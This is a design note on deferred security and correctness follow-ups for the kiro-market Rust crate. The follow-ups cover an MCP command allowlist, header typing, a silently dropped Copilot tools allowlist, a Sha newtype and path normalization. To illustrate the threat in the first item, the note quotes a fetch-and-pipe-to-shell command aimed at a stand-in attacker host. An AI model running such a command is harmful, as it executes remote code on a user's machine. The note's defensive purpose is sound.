# Deferred follow-ups from the dep-audit-triage PR

**Branch context**: `chore/dep-audit-triage` resolved 22 items from `fixes.md`
plus 5 critical issues found during the multi-reviewer PR review. Eight more
suggestions were tackled in remediation batches (A through H). This document
captures the **five remaining items** that were intentionally deferred — each
needs a design decision before implementation.

Each section has the same shape:

- **Problem** — what's wrong and where.
- **Why it matters** — concrete user / security impact.
- **Options** — choices, with tradeoffs.
- **Decision needed** — what we have to know before we can pick.
- **Scope estimate** — how invasive the work is.

---

## 1. `McpServerConfig::Stdio::command` newtype + executable allowlist

**Problem**

`crates/kiro-market-core/src/agent/types.rs:31-46` defines

```rust
pub enum McpServerConfig {
    Stdio { command: String, args: Vec<String>, env: BTreeMap<String, String> },
    ...
}
```

`command` is a free-form `String`. Any agent that ships an MCP server with
`command: "/bin/sh"`, `command: "rm"`, `command: "curl http://attacker/sh | sh"`
gets to run that exact binary on the user's host once the user opts in via
`--accept-mcp`. Today's defenses are: (a) the `--accept-mcp` opt-in itself, and
(b) the install-time warning that lists transports. Neither inspects the command.

**Why it matters**

The `--accept-mcp` opt-in is binary — once flipped, every Stdio entry in every
installed agent runs unrestricted. That's the right shape for prototype agents
the user wrote, but it's coarse for marketplace agents authored by third
parties. A user who opts in to "Terraform Agent" should not silently grant
"Random Crypto Tool Agent" the same trust on the next install.

**Options**

1. **Hardcoded allowlist** (`docker`, `node`, `python`, `python3`, `uvx`, `npx`):
   simplest, unsurprising. Rejects everything else. Real-world MCP server
   examples almost all use one of these wrappers; non-allowlist commands are
   rare and worth flagging.
2. **User-config allowlist** at `~/.config/kiro-market/mcp-allowlist.txt`:
   per-user policy; ships empty (deny-all) and the user adds binaries as they
   install agents. Highest correctness, more friction.
3. **Per-install allowlist via `--accept-mcp <command,...>`**: the user
   approves the specific commands the install will configure. Forces the user
   to read the `mcpServers` block before running.
4. **Newtype only, no allowlist**: `McpCommand::new(s)` rejects empty + shell
   metacharacters (`;|&$\``); leaves binary identity to runtime. Cheaper but
   doesn't address the "rm" case.

**Decision needed**

Where does MCP allowlist policy live and who maintains it? CLI users vs Tauri
desktop users will have different answers — the desktop UI can show a
per-binary "approve" prompt, the CLI cannot.

**Scope estimate**

- Newtype: ~50 lines + tests in `agent/types.rs`.
- Hardcoded allowlist: +20 lines + 3 tests.
- User-config: +200 lines (config file loader, schema, doc, tests).
- Per-install: +50 lines in `service::install_plugin_agents` + CLI flag plumbing.

---

## 2. `McpServerConfig::Http::headers` should be ordered, not a `BTreeMap`

**Problem**

`crates/kiro-market-core/src/agent/types.rs:48-55` declares

```rust
Http {
    url: String,
    #[serde(default)]
    headers: BTreeMap<String, String>,
},
```

HTTP headers are case-insensitive and **allow duplicates** — `Set-Cookie` is
the canonical example, but `Forwarded`, `Cache-Control`, and others can also
repeat. `BTreeMap<String, String>` enforces neither: a YAML
`headers: { Set-Cookie: a, set-cookie: b }` collapses (alphabetically last
wins), and a YAML map can't carry two entries with the same key at all. The
shape silently drops valid configs.

**Why it matters**

Right now no real agent we've seen uses duplicated headers. But the wire
shape is part of the parser contract — committing to `BTreeMap` makes a future
agent that needs `Authorization: ...; Authorization: legacy-fallback` impossible
to express, with no compile-time signal.

**Options**

1. `Vec<(String, String)>`: preserves order and duplicates; trivial dep impact.
   Loses the case-insensitive lookup ergonomics, but the install layer doesn't
   look up headers, it just emits them.
2. `Vec<(HeaderName, HeaderValue)>` from the `http` crate: gets case-insensitive
   compare for free, validates the bytes (no CRLF injection in header values),
   adds one workspace dep (~200 KB compiled).
3. Custom newtype `Headers(Vec<(HeaderName, HeaderValue)>)` with `Deserialize`
   that accepts both `seq-of-pairs` and `map`: best UX for YAML authors, more
   parser code.

**Decision needed**

Are we willing to add the `http` crate as a workspace dep? It's the
standards-correct primitive but the only consumer would be this one field
today. If we expect the Tauri side to grow more HTTP-shaped types
(MCP discovery? remote skill catalogs?), the dep pays for itself. If not,
`Vec<(String, String)>` is enough.

**Scope estimate**

- Option 1 (Vec of String pairs): ~30 lines + 4 tests.
- Options 2-3: +1 workspace dep + ~80 lines + 6 tests.

---

## 3. Copilot inner `tools: ["*"]` allowlist drop should warn at parse time

**Problem**

`crates/kiro-market-core/src/agent/parse_copilot.rs:23-46` deserializes
Copilot's `mcp-servers:` map into `BTreeMap<String, McpServerConfig>`. The
typed schema has no field for the per-server `tools: [...]` allowlist that
Copilot uses to scope down a server's surface. Serde silently ignores unknown
fields, so a Copilot agent that scoped `terraform` to `tools: ["read"]` gets
installed in Kiro with **all** of `terraform`'s tools enabled — a privilege
widening invisible to the user.

**Why it matters**

This is the worst kind of compatibility break: the install succeeds, the agent
runs, the user thinks they got what they wrote, and they have more capability
than they asked for. Compare to the typed-name validation we added in
`validation.rs::validate_name` — same shape (silent drop → loud reject), but we
haven't built it for MCP `tools` because it requires a custom `Deserialize`.

**Options**

1. **Custom `Deserialize` for `McpServerConfig`** that captures and emits
   `tools` as a discardable field, then surfaces an
   `InstallWarning::McpToolsAllowlistDropped { agent, server, tools }` in the
   install loop. Highest correctness, ~150 lines.
2. **Document-only**: add a notice to the agent install help text and CLI
   `--accept-mcp` doc. Cheap but relies on the user reading docs.
3. **Reject at parse**: refuse to install any agent with a Copilot
   `tools: [...]` allowlist that we can't honor. Strictest, breaks all
   existing MCP-bearing Copilot agents until they remove the field.

**Decision needed**

How loud should we be about this widening? Option 3 is the safest — broken
loudly beats working insecurely. Option 1 is the user-friendly middle. Need to
know whether we're shipping to users who have already-imported Copilot agents.

**Scope estimate**

- Option 1: ~150 lines (custom Deserialize + warning variant + install
  plumbing + 4 tests).
- Option 3: ~50 lines (parse-time error + 2 tests + breaking-change CHANGELOG
  note).

---

## 4. `Sha` newtype on `StructuredSource::sha`

**Problem**

`crates/kiro-market-core/src/marketplace.rs::StructuredSource` carries
`sha: Option<String>` on each variant. The string is validated only at
`verify_sha` time (defense in depth from the audit). A serde-time check would
catch a malformed pin earlier — at marketplace add, not at first install — and
make the type system carry the invariant.

**Why it matters**

Every `verify_sha` call site has to remember to validate. The runtime check is
correct today but a future caller (e.g. a `kiro-market info` that displays the
SHA) might skip it. Parse-don't-validate is the project's stated pattern for
`RelativePath` and `GitRef` already.

**Options**

1. **Newtype mirroring `RelativePath`**: `Sha(String)` with `Deserialize` that
   calls `validate_sha_prefix`. Each `StructuredSource` variant's `sha` field
   becomes `Option<Sha>`. `verify_sha` takes `&Sha` and skips the structural
   validation step.
2. **Skip**: keep runtime validation. Pay the cost of remembering to call it
   at every consumer.

**Decision needed**

Mostly mechanical. The blocking concern: existing test fixtures use short SHAs
like `"abc123"` (6 chars, fails `MIN_SHA_PREFIX_LEN=7`). They'd need to be
updated to use 7+ char hex SHAs. ~10 fixture sites across `marketplace.rs` and
`service.rs` tests.

**Scope estimate**

- ~60 lines for the newtype + Deserialize + Display.
- ~30 lines updating `StructuredSource` variants.
- ~10 fixture updates.
- 3-4 new tests for serde-time rejection of invalid SHAs.

---

## 5. `RelativePath` normalization at construction

**Problem**

`crates/kiro-market-core/src/validation.rs::RelativePath` validates traversal
and absolute paths but does not normalize. `./skills/`, `skills/`, and
`./skills` all pass and compare unequal. The dedup logic in
`service::build_registry_entries` (`crates/kiro-market-core/src/service.rs:1239-1250`)
explicitly trims leading `./` and trailing `/` to compensate. Any future
caller that compares `RelativePath`s without going through that helper can
generate duplicate `PluginEntry` rows for the same on-disk directory.

**Why it matters**

Today the only consumer is `build_registry_entries`. Future code that
compares relative paths (a "find the plugin entry that matches this
directory" search, for example) will silently miss matches that differ only in
trivial spelling. The risk is not security but correctness drift — the kind of
bug that surfaces months later as a duplicate-row in a UI list.

**Options**

1. **Normalize at construction**: strip leading `./`, normalize separators to
   `/`, strip trailing `/`. The newtype's invariant becomes "canonical form
   of a safe relative path". Existing callers that round-trip strings would
   see the normalized form (potentially observable in `marketplace.json`
   re-serialization).
2. **Document the existing pattern**: leave `RelativePath` as-is; add a
   `RelativePath::normalized_for_dedup(&self) -> &str` method that callers
   doing comparison must use. Cheaper but easy to forget.

**Decision needed**

Are we willing to change the on-disk wire format? Option 1 means a
marketplace.json with `"source": "./plugins/foo"` will round-trip as
`"source": "plugins/foo"`. That's a trivial normalization but it's a wire-format
change visible in git diffs of cached files.

**Scope estimate**

- Option 1: ~40 lines + 6 round-trip tests + cleanup of the ad-hoc trim in
  `build_registry_entries`.
- Option 2: ~20 lines + 2 tests; relies on convention.

---

## Cross-cutting note: `kiro_market_core=warn` filter is the wrong long-term fix

The "Critical #4" fix from the review pass widened the default tracing filter
in `crates/kiro-market/src/main.rs` so `warn!`s from `kiro_market_core` reach
the user. That's the right immediate mitigation but the structural answer is:

> Skip events should be data on the install result, not log lines.

Today, `project::copy_dir_recursive` skips symlinks/hardlinks with `warn!`,
and `platform::sys::create_local_link` warns from a `Drop` impl. Neither shows
up in the `InstallSkillsResult` / `InstallAgentsResult` returned to the
caller. A Tauri frontend that doesn't subscribe to tracing logs has no way to
display these to the user.

The fix is a new `InstallWarning::FileSkipped { path, reason: SkipReason }`
variant plus the plumbing to bubble skip events up from copy_dir_recursive
through the install layer. Recorded here as **deferred** because (a) it
requires changing the return type of a private helper used in many places,
and (b) the current tracing-filter widening covers the CLI path well enough
to ship.

Estimated scope: ~150 lines + 4 tests.

---

## Suggested ordering when picking these up

1. **#3 (Copilot tools privilege widening)** first — security-impacting,
   user-invisible.
2. **#5 (RelativePath normalization)** — small, mechanical, tightens the
   invariant.
3. **#4 (Sha newtype)** — natural follow-on to the audit's defense-in-depth.
4. **Cross-cutting (skip events as data)** — unblocks better Tauri UX.
5. **#1 (Stdio command allowlist)** — needs the policy decision first.
6. **#2 (HTTP headers shape)** — wait until a real agent actually needs
   duplicate headers.
